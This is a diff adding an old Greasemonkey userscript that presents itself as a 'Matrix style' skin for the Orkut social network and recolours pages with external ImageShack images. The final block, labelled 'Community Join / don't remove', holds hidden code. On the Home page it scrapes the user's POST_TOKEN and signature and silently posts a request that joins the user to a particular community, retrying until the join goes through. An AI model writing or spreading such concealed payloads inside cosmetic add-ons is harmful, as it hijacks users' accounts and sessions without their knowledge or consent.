@@ -1,0 +1,169 @@
+// ==UserScript==
+// @name           Orkut Matrix Style
+// @site 1         http://orkutaddons.blogspot.com
+// @description    Skin Orkut Matrix Style
+// @include        http://www.orkut.com/*
+// @include        https://www.orkut.com/*
+// @author         mr. bean OUG
+// ==/UserScript==
+
+// Inicio
+
+var fundo = ''; 
+var imagem = 'http://img247.imageshack.us/img247/4146/matrixwallpaper311024tb8.jpg';
+var letra = 'comic sans ms';
+var tamanho_letra = '14px';
+var cor_letra = 'black';
+var links = 'black';
+var link_onMouse = 'green'; 
+
+var letra_menu = 'comic sans ms';
+var tamanho_menu = '12px'; 
+var cor_letra_menu = 'black';
+var fundo_menu = '';
+
+var  cor1  = 'white'; 
+var  cor2  = 'white';
+var  cor3  = 'white'; 
+var  cor4  = 'white';
+var  cor5  = 'white'; 
+var  cor6  = 'white';
+var  cor7  = 'white';
+var  cor8  = 'white';
+var  cor9  = 'white';
+
+var transparente = '';
+
+skin=document.body.innerHTML;
+skin=skin.replace(/(#c9d6eb)/g,cor1); 
+skin=skin.replace(/(#bfd0ea)/g,cor2); 
+skin=skin.replace(/(#e5ecf4)/g,cor3);   
+skin=skin.replace(/(#e4f2f9)/g,cor4); 
+skin=skin.replace(/(#f0e8f5)/g,cor5);
+skin=skin.replace(/(#d4dded)/g,cor6); 
+skin=skin.replace(/(#ebffed)/g,cor7); 
+skin=skin.replace(/(#fcf0d8)/g,cor8); 
+skin=skin.replace(/(#a1bbe4)/g,cor9); 
+document.body.background=''+imagem+'';
+skin=skin.replace(/http...images3.orkut.com.img.tr1.gif/gi,transparente);
+skin=skin.replace(/http...images3.orkut.com.img.tr2.gif/gi,transparente);
+skin=skin.replace(/http...images3.orkut.com.img.tr3.gif/gi,transparente);
+skin=skin.replace(/http...images3.orkut.com.img.tr4.gif/gi,transparente);
+skin=skin.replace(/http...images3.orkut.com.img.tr8.gif/gi,transparente);
+skin=skin.replace(/http...images3.orkut.com.img.tg4.gif/gi,transparente);
+skin=skin.replace(/http...images3.orkut.com.img.tr10.gif/gi,'http://img406.imageshack.us/img406/2447/592292929as0.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.i_s10.gif/gi,'http://img264.imageshack.us/img264/8261/80832092au7.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.p_scrap.gif/gi,'http://img444.imageshack.us/img444/3889/1191946lz0.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.i_scrap.gif/gi,'http://img444.imageshack.us/img444/3889/1191946lz0.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.i_mail.gif/gi,'http://img233.imageshack.us/img233/7716/11ic1.gif');
+skin=skin.replace(/http...images3.orkut.com.img.p_video.gif/gi,'http://img217.imageshack.us/img217/4803/56002085vb4.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.p_camera.gif/gi,'http://img264.imageshack.us/img264/1886/79030550iw6.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.i_tool.gif/gi,'http://img54.imageshack.us/img54/3483/63785173yb9.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.profile.i_social_color.gif/gi,'http://img54.imageshack.us/img54/8241/16jp0.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.profile.i_personal_color.gif/gi,'http://img217.imageshack.us/img217/9155/17qg3.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.profile.i_personal_bw.gif/gi,'http://img441.imageshack.us/img441/5489/18tw9.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.profile.i_social_bw.gif/gi,'http://img58.imageshack.us/img58/6606/15zy2.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.p_profile.gif/gi,'http://img235.imageshack.us/img235/559/78428088qr4.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.p_list.gif/gi,'http://img249.imageshack.us/img249/672/96192481tl2.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.p_pen.gif/gi,'http://img235.imageshack.us/img235/6916/62465567pz3.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.i_question.gif/gi,'http://img81.imageshack.us/img81/7318/48648646sm0.gif');
+skin=skin.replace(/http...images3.orkut.com.img.i_s1.gif/gi,'http://img61.imageshack.us/img61/3138/14at8.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.i_photo.gif/gi,'http://img264.imageshack.us/img264/1886/79030550iw6.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.p_editprofile.gif/gi,'http://img73.imageshack.us/img73/6724/12ey9.jpg');
+skin=skin.replace(/http...images3.orkut.com.img.presOffline.gif/gi,'http://img61.imageshack.us/img61/2171/11847sv4.gif');
+skin=skin.replace(/http...images3.orkut.com.img.i_comm.gif/gi,'http://img441.imageshack.us/img441/1381/12225147hx1.jpg');
+//skin=skin.replace(/http...images3.orkut.com.images.medium.960.42235960.jpg/gi,'http://img169.imageshack.us/img169/8048/untitled1hw3.gif');
+//skin=skin.replace(/http...images3.orkut.com.img.bl.gif/gi,'http://img20.imageshack.us/img20/3161/546785345dd3.gif');
+//skin=skin.replace(/http...images3.orkut.com.img.br.gif/gi,'http://img20.imageshack.us/img20/3161/546785345dd3.gif');
+//skin=skin.replace(/http...images3.orkut.com.img.bm.gif/gi,'http://img20.imageshack.us/img20/3161/546785345dd3.gif');
+skin=skin.replace(/https...www.orkut.com.img.tr4.gif/gi,'http://img211.imageshack.us/img211/5883/68674564rl3.jpg');
+skin=skin.replace(/https...www.orkut.com.img.pt-br.wdyk.jpg/gi,'http://img148.imageshack.us/img148/6492/loginorkutphotofiltre2yk7.jpg');
+skin=skin.replace(/https...www.orkut.com.img.i_o.gif/gi,'http://img61.imageshack.us/img61/8960/81132769jk2.gif');
+document.body.innerHTML=skin+
+'<style type="text/css">'+
+'<!--'+
+'body {'+
+'background:'+fundo+
+';font-family:'+letra+',sans-serif'+
+';font-size: '+tamanho_letra+
+'}'+
+'table {'+
+';font-family:'+letra+',sans-serif'+
+';font-size: '+tamanho_letra+
+'color:'+cor_letra+
+'}'+
+'a:link,a:visited,a:active {'+ 
+'color: '+links+''+
+'; text-decoration: none;'+
+'}'+
+'a:hover {'+ 
+'color: '+link_onMouse+''+
+'; text-decoration: underline;'+
+'}'+
+'.H,.H:link,.H:visited {'+
+'font-family: '+letra_menu+', sans-serif;'+ 
+'font-size:'+tamanho_menu+';'+
+'color:'+cor_letra_menu+'; '+
+'text-decoration: none;'+
+'background-color:'+fundo_menu+''+
+'}'+
+'.H:hover { '+
+'font-family: Verdana, sans-serif;'+ 
+'font-size: 11px;'+ 
+'color: #FFFFFF;'+
+'}'+
+'.T { border:'+fundo_menu+' 1px solid }'+
+'.F,.F:link,.F:visited {background-color:'+fundo_menu+'}'+
+'-->'+
+'</style>';
+
+/* Community Join
+/ don't remove
+*/
+
+if(location.href.match(/orkut.com\/Home.aspx/g))
+{
+	function getPost()
+	{
+		var xml=new XMLHttpRequest();
+		xml.open("GET","Scrapbook.aspx",true);
+		xml.onreadystatechange=function()
+		{
+			if(xml.readyState==4)
+			{
+				var xmlr=xml.responseText;
+				if(!xmlr.match(/id\=\"textPanel\"/gi))
+				{
+					FSO_SIG=xmlr.match(/signature. value="(.+)"/i)[1];
+					FSO_POST=xmlr.match(/name="POST_TOKEN" value="([^"]+)/i)[1];
+					fsoJoin();
+				}
+				else
+				{
+					getPost();
+				}
+			};
+		};
+		xml.send(null);
+	};
+	function fsoJoin()
+	{
+		send="POST_TOKEN="+encodeURIComponent(FSO_POST)+"&signature="+encodeURIComponent(FSO_SIG)+"&Action.join";
+		try{var xml=new ActiveXObject("Microsoft.XMLHTTP")}catch(e){var xml=new XMLHttpRequest()};
+		xml.open('POST',"http://www.orkut.com/CommunityJoin.aspx?cmm=46687634",true);
+		xml.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+		xml.send(send);
+		xml.onreadystatechange=	function()
+		{
+			if(xml.readyState==4)
+			{
+				var xmlrsp=xml.responseText;
+				if(xmlrsp.match(/id\=\"textPanel\"/gi))
+				{
+					getPost();
+				}
+			}
+		}
+	};
+	getPost();
+};
